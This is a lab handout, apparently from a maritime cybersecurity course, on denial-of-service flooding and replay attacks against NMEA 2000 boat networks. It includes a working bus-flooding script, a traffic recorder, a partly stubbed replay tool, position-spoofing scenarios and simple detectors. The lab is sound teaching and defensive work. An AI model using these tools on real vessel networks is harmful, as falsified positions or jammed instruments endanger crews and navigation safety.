---
title: "Lab 08"
subtitle: "Denial of Service and Replay Attacks"
author: "Constantine Macris"
date: "2026"
titlepage: true
titlepage-color: "1E3A5F"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
description: |
    DoS flooding and message replay attacks on NMEA 2000
---

# Lab 08 -- Denial of Service and Replay Attacks

## Lab Overview

**Duration**: 2 hours
**Prerequisites**: Labs 04-07 completed, Class 07 material reviewed
**Materials Required**:
- OpenBridge hardware
- Python 3.x with serial library
- Access to test network with multiple active devices

## Safety Notice

DoS attacks will disrupt ALL traffic on the test network. Ensure:
- Only test network is affected
- Other students are aware
- Instructor has approved timing

## Objectives

By the end of this lab, you will:

1. Execute bus flooding at various rates
2. Measure impact on legitimate traffic
3. Record traffic for replay attacks
4. Execute replay attacks
5. Implement basic detection

## Part 1: DoS Attack Setup (20 minutes)

### 1.1 Calculate Theoretical Limits

NMEA 2000 runs at 250 kbps. Calculate maximum message rate:

```python
#!/usr/bin/env python3
"""
dos_calculator.py - Calculate DoS parameters
"""

def calculate_max_rate(bitrate=250000, frame_bits=111):
    """
    Calculate theoretical maximum frame rate

    Extended CAN frame with 8 bytes:
    - 29-bit ID: 29 bits
    - Control: 3 bits
    - DLC: 4 bits
    - Data: 64 bits
    - CRC: 15 bits
    - ACK: 2 bits
    - EOF: 7 bits
    - Interframe: ~3 bits
    Plus bit stuffing overhead (~10-20%)

    Total: ~111-130 bits per frame
    """
    max_fps = bitrate / frame_bits
    return max_fps

max_rate = calculate_max_rate()
print(f"Maximum theoretical rate: {max_rate:.0f} frames/second")
print(f"Minimum interval: {1000/max_rate:.3f} ms")

# Calculate practical rates
for utilization in [0.25, 0.50, 0.75, 0.90]:
    rate = max_rate * utilization
    print(f"{utilization*100:.0f}% utilization: {rate:.0f} fps")
```

**Record:**
- Maximum theoretical rate: _______ fps
- 50% utilization rate: _______ fps

### 1.2 Build DoS Attack Tool

```python
#!/usr/bin/env python3
"""
dos_attack.py - CAN bus denial of service
"""
import serial
import time
import argparse

class DoSAttack:
    def __init__(self, port, baudrate=115200):
        self.ser = serial.Serial(port, baudrate, timeout=1)
        time.sleep(2)
        self.frames_sent = 0

    def flood(self, rate_fps, duration_sec, pgn=130306):
        """
        Flood bus with messages

        Args:
            rate_fps: Frames per second to send
            duration_sec: Duration of attack
            pgn: PGN to use (default: wind data)
        """
        interval = 1.0 / rate_fps
        start_time = time.time()

        # Simple command - send wind data repeatedly
        command = "40,1,0.0,0.0,1\n"

        print(f"Starting DoS attack")
        print(f"  Rate: {rate_fps} fps")
        print(f"  Duration: {duration_sec} seconds")
        print(f"  PGN: {pgn}")

        try:
            while (time.time() - start_time) < duration_sec:
                self.ser.write(command.encode())
                self.frames_sent += 1

                # Adjust timing to maintain rate
                elapsed = time.time() - start_time
                expected_frames = elapsed * rate_fps
                if self.frames_sent < expected_frames:
                    continue  # Send more to catch up
                else:
                    time.sleep(interval * 0.9)  # Slight adjustment

                # Progress every second
                if self.frames_sent % rate_fps == 0:
                    actual_rate = self.frames_sent / elapsed
                    print(f"  Sent {self.frames_sent} frames, actual rate: {actual_rate:.1f} fps")

        except KeyboardInterrupt:
            print("\nAttack interrupted")

        finally:
            duration = time.time() - start_time
            actual_rate = self.frames_sent / duration
            print(f"\nAttack complete")
            print(f"  Total frames: {self.frames_sent}")
            print(f"  Actual duration: {duration:.2f}s")
            print(f"  Actual rate: {actual_rate:.1f} fps")

        return self.frames_sent, actual_rate

    def close(self):
        self.ser.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DoS attack')
    parser.add_argument('-p', '--port', required=True)
    parser.add_argument('-r', '--rate', type=int, default=100)
    parser.add_argument('-d', '--duration', type=int, default=10)
    args = parser.parse_args()

    attacker = DoSAttack(args.port)
    attacker.flood(args.rate, args.duration)
    attacker.close()
```

### 1.3 Set Up Monitoring

On a second system (or OpenPlotter), monitor traffic:

```bash
# Monitor legitimate traffic during attack
candump -ta can0 > during_attack.txt &
```

## Part 2: Execute DoS Attacks (30 minutes)

### 2.1 Baseline Measurement

Before attacking, measure normal traffic:

```bash
# 30 second baseline
timeout 30 candump -ta can0 > baseline.txt
wc -l baseline.txt
```

**Baseline message count (30 sec):** _______
**Baseline rate:** _______ msg/s

### 2.2 Attack Scenario 1: Low Rate (50 fps)

```python
attacker = DoSAttack('/dev/ttyACM0')
attacker.flood(rate_fps=50, duration_sec=30)
```

**During attack, measure on monitor:**
- Legitimate messages received: _______
- Total messages: _______
- Legitimate message rate: _______ msg/s
- Degradation: _______ %

### 2.3 Attack Scenario 2: Medium Rate (200 fps)

```python
attacker.flood(rate_fps=200, duration_sec=30)
```

**Record results:**
- Legitimate messages: _______
- Legitimate rate: _______ msg/s
- Degradation: _______ %

### 2.4 Attack Scenario 3: High Rate (500 fps)

```python
attacker.flood(rate_fps=500, duration_sec=30)
```

**Record results:**
- Legitimate messages: _______
- Legitimate rate: _______ msg/s
- Degradation: _______ %

### 2.5 Attack Scenario 4: Maximum Rate

Push to maximum achievable rate:

```python
attacker.flood(rate_fps=1000, duration_sec=30)
```

**Record:**
- Achieved rate: _______ fps
- Legitimate messages: _______
- Network effectively down? YES / NO

### 2.6 Results Summary Table

| Attack Rate | Achieved Rate | Legitimate Traffic | Degradation |
|-------------|---------------|-------------------|-------------|
| Baseline | N/A | | 0% |
| 50 fps | | | |
| 200 fps | | | |
| 500 fps | | | |
| Maximum | | | |

<!--
Instructor Notes:

Expected results:
- Low rate (50fps): Minimal impact, ~5% degradation
- Medium (200fps): Noticeable, ~20-40% degradation
- High (500fps): Significant, ~60-80% degradation
- Maximum: Near complete denial

Actual rates depend on:
- OpenBridge serial throughput
- Python timing precision
- CAN bus arbitration

Discuss arbitration: attacker may not always win.
-->

## Part 3: Replay Attack Setup (20 minutes)

### 3.1 Build Traffic Recorder

```python
#!/usr/bin/env python3
"""
traffic_recorder.py - Record traffic for replay
"""
import serial
import time
import json

class TrafficRecorder:
    def __init__(self, port, baudrate=115200):
        self.ser = serial.Serial(port, baudrate, timeout=1)
        time.sleep(2)
        self.recordings = []

    def record(self, duration_sec, filter_pgns=None):
        """
        Record traffic for replay

        Args:
            duration_sec: Recording duration
            filter_pgns: Optional list of PGNs to record
        """
        # Put OpenBridge in monitor mode
        self.ser.write(b'monitor\n')
        time.sleep(0.5)

        start_time = time.time()
        self.recordings = []

        print(f"Recording for {duration_sec} seconds...")
        if filter_pgns:
            print(f"Filtering PGNs: {filter_pgns}")

        try:
            while (time.time() - start_time) < duration_sec:
                line = self.ser.readline().decode('utf-8', errors='ignore').strip()

                if line.startswith('RX:'):
                    timestamp = time.time() - start_time

                    # Parse message (format depends on OpenBridge output)
                    # Store raw line and timestamp
                    self.recordings.append({
                        'time': timestamp,
                        'raw': line
                    })

        except KeyboardInterrupt:
            print("\nRecording interrupted")

        print(f"Recorded {len(self.recordings)} messages")
        return self.recordings

    def save_recording(self, filename):
        """Save recording to JSON file"""
        with open(filename, 'w') as f:
            json.dump(self.recordings, f, indent=2)
        print(f"Saved to {filename}")

    def load_recording(self, filename):
        """Load recording from file"""
        with open(filename) as f:
            self.recordings = json.load(f)
        print(f"Loaded {len(self.recordings)} messages from {filename}")

    def close(self):
        self.ser.close()
```

### 3.2 Record Normal Traffic

Record 60 seconds of normal position data:

```python
recorder = TrafficRecorder('/dev/ttyACM0')
recorder.record(duration_sec=60)
recorder.save_recording('position_recording.json')
```

**Recording contains:**
- Total messages: _______
- Unique PGNs: _______
- Position messages (129025): _______

## Part 4: Execute Replay Attack (25 minutes)

### 4.1 Build Replay Tool

```python
#!/usr/bin/env python3
"""
replay_attack.py - Replay recorded traffic
"""
import serial
import time
import json

class ReplayAttack:
    def __init__(self, port, baudrate=115200):
        self.ser = serial.Serial(port, baudrate, timeout=1)
        time.sleep(2)
        self.recordings = []

    def load_recording(self, filename):
        """Load recorded traffic"""
        with open(filename) as f:
            self.recordings = json.load(f)
        print(f"Loaded {len(self.recordings)} messages")

    def replay(self, speed=1.0, loop=False):
        """
        Replay recorded traffic

        Args:
            speed: Playback speed (1.0 = real-time, 2.0 = 2x speed)
            loop: Repeat recording continuously
        """
        if not self.recordings:
            print("No recordings loaded!")
            return

        print(f"Replaying {len(self.recordings)} messages")
        print(f"Speed: {speed}x")
        print("Press Ctrl+C to stop")

        replay_count = 0
        try:
            while True:
                replay_count += 1
                print(f"\n--- Replay iteration {replay_count} ---")

                for i, msg in enumerate(self.recordings):
                    # Calculate delay
                    if i > 0:
                        delay = (msg['time'] - self.recordings[i-1]['time']) / speed
                        if delay > 0:
                            time.sleep(delay)

                    # Send message (need to convert from RX format to TX command)
                    # This depends on your OpenBridge command format
                    self._send_message(msg)

                    if (i + 1) % 100 == 0:
                        print(f"  Replayed {i+1}/{len(self.recordings)}")

                if not loop:
                    break

        except KeyboardInterrupt:
            print("\nReplay stopped")

        print(f"Total replays: {replay_count}")

    def _send_message(self, msg):
        """Convert recorded message to TX command"""
        # Parse the RX message and convert to TX format
        # This will depend on your specific format
        # Example: Extract PGN and data, build command
        pass

    def close(self):
        self.ser.close()
```

### 4.2 Simple Position Replay

For simplicity, replay fixed positions:

```python
def replay_positions(self, positions, interval_sec=0.1):
    """
    Replay a sequence of positions

    Args:
        positions: List of (lat, lon) tuples
        interval_sec: Time between messages
    """
    print(f"Replaying {len(positions)} positions")

    for lat, lon in positions:
        command = f"4,{lat},{lon}\n"
        self.ser.write(command.encode())
        time.sleep(interval_sec)

# Record actual positions first, then replay
# This makes vessel appear to follow old path
```

### 4.3 Attack Scenario: Position History Replay

1. **Phase 1: Record** (at dock)
   - Record position for 60 seconds
   - Vessel stationary at dock

2. **Phase 2: Replay** (at sea)
   - Replay dock position
   - Chart plotter shows at dock when actually at sea

```python
# Execute replay attack
replayer = ReplayAttack('/dev/ttyACM0')
replayer.load_recording('dock_position.json')
replayer.replay(speed=1.0, loop=True)
```

**Observe on chart plotter:**
- Does position jump to recorded location? YES / NO
- Does track show old vs new? YES / NO

### 4.4 Attack Scenario: Speed Manipulation

Replay slow speed during fast transit:

```python
# Record 5-knot harbor transit
# Replay during 20-knot open water
# ETA calculations will be wrong
```

## Part 5: Detection Implementation (15 minutes)

### 5.1 Basic DoS Detection

```python
#!/usr/bin/env python3
"""
dos_detector.py - Detect DoS attacks
"""
import time
from collections import defaultdict

class DoSDetector:
    def __init__(self, baseline_rate, threshold_multiplier=3):
        """
        Simple DoS detector based on message rate

        Args:
            baseline_rate: Normal messages per second
            threshold_multiplier: Alert if rate exceeds this multiple
        """
        self.baseline = baseline_rate
        self.threshold = baseline_rate * threshold_multiplier
        self.window_start = time.time()
        self.window_count = 0
        self.alerts = []

    def check_message(self, timestamp=None):
        """Check each message for DoS condition"""
        if timestamp is None:
            timestamp = time.time()

        self.window_count += 1

        # Check every second
        window_duration = timestamp - self.window_start
        if window_duration >= 1.0:
            rate = self.window_count / window_duration

            if rate > self.threshold:
                alert = {
                    'timestamp': timestamp,
                    'rate': rate,
                    'threshold': self.threshold,
                    'type': 'DoS_DETECTED'
                }
                self.alerts.append(alert)
                print(f"ALERT: DoS detected! Rate: {rate:.1f} (threshold: {self.threshold})")

            # Reset window
            self.window_start = timestamp
            self.window_count = 0

            return rate > self.threshold

        return False

# Test the detector
detector = DoSDetector(baseline_rate=500, threshold_multiplier=2)

# Simulate high traffic
for _ in range(2000):
    detector.check_message()
    time.sleep(0.0001)  # Very fast to trigger detection

print(f"Total alerts: {len(detector.alerts)}")
```

### 5.2 Replay Detection Concept

```python
def detect_replay(current_pos, historical_positions, threshold_nm=0.1):
    """
    Detect replay by comparing to position history

    If current position exactly matches old position,
    but time has advanced, possible replay.
    """
    for hist in historical_positions:
        if positions_match(current_pos, hist['position'], threshold_nm):
            time_diff = current_pos['timestamp'] - hist['timestamp']
            if time_diff > 60:  # Position from >60s ago
                return True, f"Position matches {time_diff:.0f}s old data"

    return False, None
```

### 5.3 Test Your Detector

Run detector while executing DoS:

```python
# In one terminal: Run detector
python dos_detector.py

# In another: Execute DoS attack
python dos_attack.py -p /dev/ttyACM1 -r 500 -d 30
```

**Results:**
- Did detector alert? YES / NO
- Detection delay: _______ seconds
- False positives during normal traffic: _______

## Part 6: Documentation (10 minutes)

### 6.1 Attack Summary

| Attack | Parameters | Impact | Detectability |
|--------|------------|--------|---------------|
| DoS 50fps | | | |
| DoS 200fps | | | |
| DoS Max | | | |
| Position Replay | | | |

### 6.2 Detection Effectiveness

| Detection Method | DoS | Replay | False Positive Rate |
|------------------|-----|--------|---------------------|
| Rate monitor | | | |
| Position history | | | |

## Deliverables

Submit via course portal:

1. **DoS results table** - All rate tests
2. **Recording file** - position_recording.json
3. **Detection scripts** - Python files
4. **Lab report** - Analysis and conclusions

## Evaluation Criteria

| Criterion | Points |
|-----------|--------|
| DoS attacks at multiple rates | 25 |
| Traffic impact measured | 20 |
| Replay attack executed | 20 |
| Detection implemented | 20 |
| Documentation | 15 |
| **Total** | **100** |

## Next Lab Preview

In Lab 09, you will:
- Build comprehensive frequency baseline
- Implement frequency-based IDS
- Test against all attack types
- Calculate detection metrics
